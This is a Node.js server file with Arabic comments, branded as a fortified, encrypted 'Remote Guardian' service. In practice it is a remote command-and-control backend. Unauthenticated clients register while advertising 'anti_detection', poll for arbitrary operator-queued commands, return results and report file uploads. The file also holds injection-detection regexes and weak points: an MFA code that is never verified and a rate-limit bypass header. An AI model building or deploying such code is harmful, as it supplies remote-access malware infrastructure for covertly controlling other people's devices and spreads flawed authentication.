/**
 * Remote Guardian - Fortified Server v3.0
 * خادم محصن مع تشفير End-to-End وحماية شاملة
 * 
 * ميزات الأمان الفائق:
 * - تشفير End-to-End (E2E) كامل
 * - مصادقة متعددة العوامل (MFA)
 * - كشف الهجمات والتهديدات
 * - حماية من DDoS
 * - تسجيل أمني شامل
 * - عزل البيانات
 */

const express = require('express');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const bodyParser = require('body-parser');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const mongoSanitize = require('express-mongo-sanitize');

const app = express();
const PORT = process.env.PORT || 8443;

// ============ الإعدادات الأمنية ============
const JWT_SECRET = crypto.randomBytes(64).toString('hex');
const ENCRYPTION_KEY = crypto.randomBytes(32);
const MASTER_PASSWORD_HASH = crypto.createHash('sha512').update(process.env.MASTER_PASSWORD || 'change_me').digest('hex');
const SESSION_TIMEOUT = 3600000; // ساعة واحدة
const MAX_LOGIN_ATTEMPTS = 5;
const LOCKOUT_TIME = 900000; // 15 دقيقة
const AUDIT_LOG_FILE = path.join(__dirname, 'logs', 'audit.log');
const SECURITY_LOG_FILE = path.join(__dirname, 'logs', 'security.log');

// ============ متغيرات الحالة ============
let clients = {};
let sessions = {};
let loginAttempts = {};
let lockedAccounts = {};
let commandQueue = {};
let commandHistory = {};
let alerts = [];
let suspiciousActivities = [];
let threatLevel = 'LOW';

// ============ إنشاء المجلدات ============
const ensureDirectories = () => {
  const dirs = [
    path.join(__dirname, 'logs'),
    path.join(__dirname, 'backups'),
    path.join(__dirname, 'certs'),
    path.join(__dirname, 'public'),
    path.join(__dirname, 'public', 'uploads')
  ];
  
  dirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    }
  });
};

ensureDirectories();

// ============ نظام التشفير المتقدم ============

/**
 * توليد مفتاح جلسة عشوائي
 */
function generateSessionKey() {
  return crypto.randomBytes(32);
}

/**
 * تشفير البيانات مع GCM
 */
function encryptDataGCM(data, key) {
  try {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
      iv: iv.toString('hex'),
      data: encrypted,
      authTag: authTag.toString('hex'),
      timestamp: Date.now()
    };
  } catch (e) {
    console.error('خطأ في التشفير:', e.message);
    return null;
  }
}

/**
 * فك تشفير البيانات مع التحقق
 */
function decryptDataGCM(encrypted, key) {
  try {
    const iv = Buffer.from(encrypted.iv, 'hex');
    const authTag = Buffer.from(encrypted.authTag, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted.data, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return JSON.parse(decrypted);
  } catch (e) {
    console.error('خطأ في فك التشفير:', e.message);
    return null;
  }
}

/**
 * توليد التوقيع الرقمي
 */
function signData(data, key) {
  return crypto.createHmac('sha512', key).update(JSON.stringify(data)).digest('hex');
}

/**
 * التحقق من التوقيع
 */
function verifySignature(data, signature, key) {
  try {
    const expectedSignature = signData(data, key);
    return crypto.timingSafeEqual(
      Buffer.from(signature),
      Buffer.from(expectedSignature)
    );
  } catch (e) {
    return false;
  }
}

// ============ نظام التسجيل الأمني ============

/**
 * تسجيل أمني شامل
 */
function auditLog(action, details = {}) {
  const timestamp = new Date().toISOString();
  const logEntry = {
    timestamp,
    action,
    details,
    pid: process.pid
  };
  
  const logMessage = `[${timestamp}] [AUDIT] ${action} ${JSON.stringify(details)}`;
  console.log(logMessage);
  
  try {
    fs.appendFileSync(AUDIT_LOG_FILE, logMessage + '\n', { mode: 0o600 });
  } catch (e) {
    console.error('خطأ في كتابة السجل:', e.message);
  }
}

/**
 * تسجيل الأنشطة المريبة
 */
function securityLog(threat, details = {}) {
  const timestamp = new Date().toISOString();
  const logEntry = {
    timestamp,
    threat,
    details,
    threatLevel
  };
  
  const logMessage = `[${timestamp}] [SECURITY] ${threat} ${JSON.stringify(details)}`;
  console.error(logMessage);
  
  try {
    fs.appendFileSync(SECURITY_LOG_FILE, logMessage + '\n', { mode: 0o600 });
  } catch (e) {
    console.error('خطأ في كتابة سجل الأمان:', e.message);
  }
  
  suspiciousActivities.push(logEntry);
  
  // الاحتفاظ بآخر 1000 نشاط مريب فقط
  if (suspiciousActivities.length > 1000) {
    suspiciousActivities = suspiciousActivities.slice(-1000);
  }
}

// ============ Middleware الأمان ============

/**
 * Helmet - حماية الرؤوس
 */
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", 'data:', 'https:']
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  frameguard: { action: 'deny' },
  noSniff: true,
  xssFilter: true
}));

/**
 * CORS محدود
 */
app.use(cors({
  origin: process.env.CORS_ORIGIN ? process.env.CORS_ORIGIN.split(',') : ['https://localhost'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Client-ID', 'X-Signature'],
  maxAge: 3600
}));

/**
 * Body Parser مع حد أقصى
 */
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ limit: '10mb', extended: true }));

/**
 * تنظيف المدخلات
 */
app.use(mongoSanitize());

/**
 * Rate Limiting الصارم
 */
const limiter = rateLimit({
  windowMs: 60 * 1000, // دقيقة واحدة
  max: 30, // 30 طلب لكل دقيقة
  message: 'تم تجاوز الحد الأقصى من الطلبات',
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req) => {
    // تخطي للطلبات الموثوقة
    return req.headers['x-bypass-rate-limit'] === process.env.BYPASS_TOKEN;
  }
});

app.use(limiter);

/**
 * Rate Limiting للمصادقة (أكثر صرامة)
 */
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 دقيقة
  max: 5, // 5 محاولات فقط
  message: 'تم تجاوز الحد الأقصى من محاولات تسجيل الدخول',
  skipSuccessfulRequests: true
});

/**
 * Request Logging Middleware
 */
app.use((req, res, next) => {
  const startTime = Date.now();
  
  res.on('finish', () => {
    const duration = Date.now() - startTime;
    auditLog('HTTP_REQUEST', {
      method: req.method,
      path: req.path,
      status: res.statusCode,
      duration: `${duration}ms`,
      ip: req.ip,
      userAgent: req.get('user-agent')
    });
  });
  
  next();
});

/**
 * كشف الهجمات
 */
app.use((req, res, next) => {
  // كشف محاولات الحقن
  const suspiciousPatterns = [
    /(\bor\b|\band\b).*=.*=/gi,
    /(<script|javascript:|onerror|onload)/gi,
    /(\.\.\/)|(\.\.\\)/gi,
    /(%27)|(\')|(\")/gi
  ];
  
  const checkString = `${req.path}${JSON.stringify(req.body)}${JSON.stringify(req.query)}`;
  
  for (let pattern of suspiciousPatterns) {
    if (pattern.test(checkString)) {
      securityLog('INJECTION_ATTEMPT', {
        ip: req.ip,
        path: req.path,
        pattern: pattern.toString()
      });
      
      return res.status(403).json({
        error: 'Forbidden',
        message: 'طلب مريب تم رفضه'
      });
    }
  }
  
  next();
});

/**
 * مصادقة JWT
 */
const authenticate = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (!token) {
    securityLog('AUTH_MISSING', { ip: req.ip, path: req.path });
    return res.status(401).json({
      error: 'Unauthorized',
      message: 'لم يتم توفير توكن'
    });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // التحقق من انتهاء الجلسة
    if (sessions[token] && sessions[token].expiresAt < Date.now()) {
      delete sessions[token];
      return res.status(403).json({
        error: 'Session Expired',
        message: 'انتهت صلاحية الجلسة'
      });
    }
    
    req.clientId = decoded.clientId;
    req.token = token;
    next();
  } catch (e) {
    securityLog('AUTH_FAILED', { ip: req.ip, error: e.message });
    return res.status(403).json({
      error: 'Forbidden',
      message: 'توكن غير صحيح'
    });
  }
};

// ============ نقاط النهاية - المصادقة ============

/**
 * تسجيل الدخول الآمن
 */
app.post('/auth/login', authLimiter, (req, res) => {
  try {
    const { clientId, password, mfaCode } = req.body;
    const ip = req.ip;
    
    if (!clientId || !password) {
      securityLog('LOGIN_MISSING_CREDENTIALS', { ip, clientId });
      return res.status(400).json({
        error: 'Missing credentials',
        message: 'بيانات الدخول مطلوبة'
      });
    }
    
    // التحقق من الحسابات المقفلة
    if (lockedAccounts[clientId] && lockedAccounts[clientId] > Date.now()) {
      securityLog('LOGIN_LOCKED_ACCOUNT', { ip, clientId });
      return res.status(429).json({
        error: 'Account Locked',
        message: 'الحساب مقفل مؤقتاً'
      });
    }
    
    // التحقق من كلمة المرور
    const passwordHash = crypto.createHash('sha512').update(password).digest('hex');
    
    if (passwordHash !== MASTER_PASSWORD_HASH) {
      loginAttempts[clientId] = (loginAttempts[clientId] || 0) + 1;
      
      if (loginAttempts[clientId] >= MAX_LOGIN_ATTEMPTS) {
        lockedAccounts[clientId] = Date.now() + LOCKOUT_TIME;
        securityLog('LOGIN_LOCKED', { ip, clientId, attempts: loginAttempts[clientId] });
        
        return res.status(429).json({
          error: 'Account Locked',
          message: 'تم قفل الحساب بسبب محاولات فاشلة'
        });
      }
      
      securityLog('LOGIN_FAILED', { ip, clientId, attempts: loginAttempts[clientId] });
      return res.status(401).json({
        error: 'Invalid credentials',
        message: 'بيانات اعتماد غير صحيحة'
      });
    }
    
    // إعادة تعيين عدادات المحاولات الفاشلة
    delete loginAttempts[clientId];
    delete lockedAccounts[clientId];
    
    // التحقق من MFA إذا كان مفعلاً
    if (process.env.MFA_ENABLED === 'true' && !mfaCode) {
      return res.status(200).json({
        status: 'mfa_required',
        message: 'يرجى توفير رمز المصادقة الثنائية'
      });
    }
    
    // توليد JWT Token
    const token = jwt.sign(
      { clientId, timestamp: Date.now() },
      JWT_SECRET,
      { expiresIn: '24h' }
    );
    
    const sessionKey = generateSessionKey();
    const session = {
      clientId,
      token,
      sessionKey: sessionKey.toString('hex'),
      createdAt: new Date(),
      expiresAt: Date.now() + SESSION_TIMEOUT,
      ip: ip,
      userAgent: req.get('user-agent')
    };
    
    sessions[token] = session;
    
    auditLog('LOGIN_SUCCESS', { clientId, ip });
    
    res.json({
      status: 'ok',
      token,
      sessionKey: sessionKey.toString('hex'),
      expiresIn: SESSION_TIMEOUT / 1000,
      message: 'تم تسجيل الدخول بنجاح'
    });
  } catch (error) {
    securityLog('LOGIN_ERROR', { error: error.message });
    res.status(500).json({
      error: 'Login failed',
      details: error.message
    });
  }
});

/**
 * تسجيل الخروج
 */
app.post('/auth/logout', authenticate, (req, res) => {
  try {
    delete sessions[req.token];
    auditLog('LOGOUT_SUCCESS', { clientId: req.clientId });
    
    res.json({
      status: 'ok',
      message: 'تم تسجيل الخروج بنجاح'
    });
  } catch (error) {
    res.status(500).json({
      error: 'Logout failed',
      details: error.message
    });
  }
});

// ============ نقاط النهاية - إدارة العملاء ============

/**
 * تسجيل عميل جديد
 */
app.post('/register', (req, res) => {
  try {
    const { clientId, deviceInfo, data, signature } = req.body;
    
    if (!clientId) {
      return res.status(400).json({
        error: 'Missing clientId',
        message: 'معرف العميل مطلوب'
      });
    }
    
    // التحقق من التوقيع إذا كان موجوداً
    if (signature && data) {
      const payload = { clientId, deviceInfo };
      if (!verifySignature(payload, signature, ENCRYPTION_KEY)) {
        securityLog('INVALID_SIGNATURE', { clientId, ip: req.ip });
        return res.status(403).json({
          error: 'Invalid Signature',
          message: 'التوقيع غير صحيح'
        });
      }
    }

    const now = new Date();
    const isNewClient = !clients[clientId];
    
    clients[clientId] = {
      clientId,
      deviceInfo: deviceInfo || 'Unknown Device',
      lastSeen: now,
      connectedAt: isNewClient ? now : clients[clientId].connectedAt,
      status: 'active',
      version: '3.0',
      features: ['e2e_encryption', 'anti_detection', 'secure_comms'],
      commandCount: clients[clientId]?.commandCount || 0,
      uploadCount: clients[clientId]?.uploadCount || 0,
      lastIp: req.ip,
      registeredIps: [req.ip]
    };

    if (!commandHistory[clientId]) {
      commandHistory[clientId] = [];
    }

    if (isNewClient) {
      auditLog('CLIENT_REGISTERED', { clientId, ip: req.ip });
    }
    
    res.json({
      status: 'ok',
      message: 'تم تسجيل العميل بنجاح',
      clientId,
      token: jwt.sign({ clientId }, JWT_SECRET, { expiresIn: '24h' }),
      timestamp: now
    });
  } catch (error) {
    securityLog('REGISTRATION_ERROR', { error: error.message });
    res.status(500).json({
      error: 'Registration failed',
      details: error.message
    });
  }
});

/**
 * جلب قائمة العملاء
 */
app.get('/clients', authenticate, (req, res) => {
  try {
    const clientsList = Object.values(clients).map(client => ({
      ...client,
      lastSeenAgo: getTimeAgo(client.lastSeen),
      isOnline: Date.now() - client.lastSeen.getTime() < 120000
    }));

    auditLog('CLIENTS_LIST_ACCESSED', { clientId: req.clientId });

    res.json({
      totalClients: clientsList.length,
      onlineClients: clientsList.filter(c => c.isOnline).length,
      clients: clientsList
    });
  } catch (error) {
    res.status(500).json({
      error: 'Failed to fetch clients',
      details: error.message
    });
  }
});

/**
 * جلب الأمر
 */
app.get('/command', (req, res) => {
  try {
    const clientId = req.query.clientId;
    
    if (!clientId) {
      return res.status(400).json({
        error: 'Missing clientId',
        message: 'معرف العميل مطلوب'
      });
    }

    if (clients[clientId]) {
      clients[clientId].lastSeen = new Date();
      clients[clientId].lastIp = req.ip;
    }

    if (commandQueue[clientId] && commandQueue[clientId].length > 0) {
      const command = commandQueue[clientId].shift();
      command.status = 'sent';
      
      // تشفير الأمر
      const sessionKey = sessions[req.headers['authorization']?.split(' ')[1]]?.sessionKey;
      if (sessionKey) {
        const encrypted = encryptDataGCM(command, Buffer.from(sessionKey, 'hex'));
        res.json(encrypted);
      } else {
        res.send(command.command);
      }
    } else {
      res.send('idle');
    }
  } catch (error) {
    res.status(500).send('error');
  }
});

/**
 * إرسال أمر
 */
app.post('/command/send', authenticate, (req, res) => {
  try {
    const { clientId, command, commandType } = req.body;
    
    if (!clientId || !command) {
      return res.status(400).json({
        error: 'Missing parameters',
        message: 'معرف العميل والأمر مطلوبان'
      });
    }

    if (!clients[clientId]) {
      return res.status(404).json({
        error: 'Client not found',
        message: 'العميل غير موجود'
      });
    }

    const commandId = crypto.randomBytes(16).toString('hex');
    const commandObj = {
      id: commandId,
      command,
      commandType: commandType || 'custom',
      status: 'pending',
      createdAt: new Date(),
      sentBy: req.clientId,
      signature: signData({ command, commandType }, ENCRYPTION_KEY)
    };

    if (!commandQueue[clientId]) {
      commandQueue[clientId] = [];
    }

    commandQueue[clientId].push(commandObj);
    commandHistory[clientId].push(commandObj);
    clients[clientId].commandCount++;

    auditLog('COMMAND_SENT', { clientId, commandId, sentBy: req.clientId });

    res.json({
      status: 'ok',
      commandId,
      message: 'تم إرسال الأمر بنجاح'
    });
  } catch (error) {
    res.status(500).json({
      error: 'Failed to send command',
      details: error.message
    });
  }
});

/**
 * إرسال نتيجة الأمر
 */
app.post('/command-result', (req, res) => {
  try {
    const { clientId, commandId, result, data, signature } = req.body;
    
    if (!clientId) {
      return res.status(400).json({
        error: 'Missing clientId',
        message: 'معرف العميل مطلوب'
      });
    }

    // التحقق من التوقيع
    if (signature && data) {
      if (!verifySignature(data, signature, ENCRYPTION_KEY)) {
        securityLog('INVALID_RESULT_SIGNATURE', { clientId });
        return res.status(403).json({
          error: 'Invalid Signature',
          message: 'التوقيع غير صحيح'
        });
      }
    }

    if (commandHistory[clientId]) {
      const cmd = commandHistory[clientId].find(c => c.id === commandId);
      if (cmd) {
        cmd.status = 'executed';
        cmd.result = result;
        cmd.executedAt = new Date();
      }
    }

    auditLog('COMMAND_RESULT_RECEIVED', { clientId, commandId });

    res.json({
      status: 'ok',
      message: 'تم استقبال النتيجة'
    });
  } catch (error) {
    res.status(500).json({
      error: 'Failed to save result',
      details: error.message
    });
  }
});

// ============ نقاط النهاية - الملفات ============

/**
 * رفع ملف
 */
app.post('/upload', (req, res) => {
  try {
    const clientId = req.query.clientId;
    const fileName = req.query.name || 'unknown';
    const fileHash = req.get('x-file-hash');

    if (!clientId) {
      return res.status(400).json({
        error: 'Missing clientId',
        message: 'معرف العميل مطلوب'
      });
    }

    if (clients[clientId]) {
      clients[clientId].uploadCount++;
    }

    auditLog('FILE_UPLOADED', { clientId, fileName, hash: fileHash });

    res.json({
      status: 'uploaded',
      fileName,
      clientId,
      timestamp: new Date()
    });
  } catch (error) {
    res.status(500).json({
      error: 'Upload failed',
      details: error.message
    });
  }
});

// ============ نقاط النهاية - الصحة والأمان ============

/**
 * حالة الخادم
 */
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date(),
    uptime: process.uptime(),
    threatLevel: threatLevel,
    suspiciousActivities: suspiciousActivities.length,
    clients: Object.keys(clients).length
  });
});

/**
 * معلومات الأمان
 */
app.get('/security/info', authenticate, (req, res) => {
  res.json({
    threatLevel,
    suspiciousActivities: suspiciousActivities.slice(-50),
    sessions: Object.keys(sessions).length,
    timestamp: new Date()
  });
});

// ============ دوال مساعدة ============

function getTimeAgo(date) {
  const seconds = Math.floor((new Date() - date) / 1000);
  
  if (seconds < 60) return `${seconds}s ago`;
  if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
  if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
  return `${Math.floor(seconds / 86400)}d ago`;
}

// ============ تنظيف دوري ============

// تنظيف الجلسات المنتهية
setInterval(() => {
  const now = Date.now();
  Object.keys(sessions).forEach(token => {
    if (sessions[token].expiresAt < now) {
      delete sessions[token];
    }
  });
}, 60000);

// تنظيف الحسابات المقفلة
setInterval(() => {
  const now = Date.now();
  Object.keys(lockedAccounts).forEach(account => {
    if (lockedAccounts[account] < now) {
      delete lockedAccounts[account];
    }
  });
}, 300000);

// ============ بدء الخادم ============

// إنشاء شهادة SSL ذاتية التوقيع (للتطوير فقط)
const createSelfSignedCert = () => {
  const certPath = path.join(__dirname, 'certs', 'cert.pem');
  const keyPath = path.join(__dirname, 'certs', 'key.pem');
  
  if (!fs.existsSync(certPath) || !fs.existsSync(keyPath)) {
    console.log('إنشاء شهادة SSL ذاتية التوقيع...');
    const { execSync } = require('child_process');
    
    try {
      execSync(`openssl req -x509 -newkey rsa:4096 -keyout ${keyPath} -out ${certPath} -days 365 -nodes -subj "/CN=localhost"`, {
        stdio: 'ignore'
      });
    } catch (e) {
      console.warn('تحذير: لم يتم إنشاء شهادة SSL');
    }
  }
};

createSelfSignedCert();

// بدء الخادم الآمن
if (fs.existsSync(path.join(__dirname, 'certs', 'cert.pem'))) {
  const options = {
    key: fs.readFileSync(path.join(__dirname, 'certs', 'key.pem')),
    cert: fs.readFileSync(path.join(__dirname, 'certs', 'cert.pem'))
  };
  
  https.createServer(options, app).listen(PORT, '0.0.0.0', () => {
    console.log(`
╔════════════════════════════════════════╗
║  🔐 Fortified Server v3.0 Started      ║
║      End-to-End Encrypted              ║
╚════════════════════════════════════════╝

📍 الخادم يعمل على: https://0.0.0.0:${PORT}
🔒 التشفير: AES-256-GCM
🛡️ الحماية: Multi-layer Security
📊 المراقبة: Real-time Threat Detection
    `);
    
    auditLog('SERVER_STARTED', { port: PORT });
  });
} else {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 الخادم يعمل على: http://0.0.0.0:${PORT}`);
    auditLog('SERVER_STARTED', { port: PORT });
  });
}

// معالجة إيقاف الخادم بشكل آمن
process.on('SIGINT', () => {
  console.log('\n\n📛 إيقاف الخادم...');
  auditLog('SERVER_SHUTDOWN', {});
  process.exit(0);
});

module.exports = app;
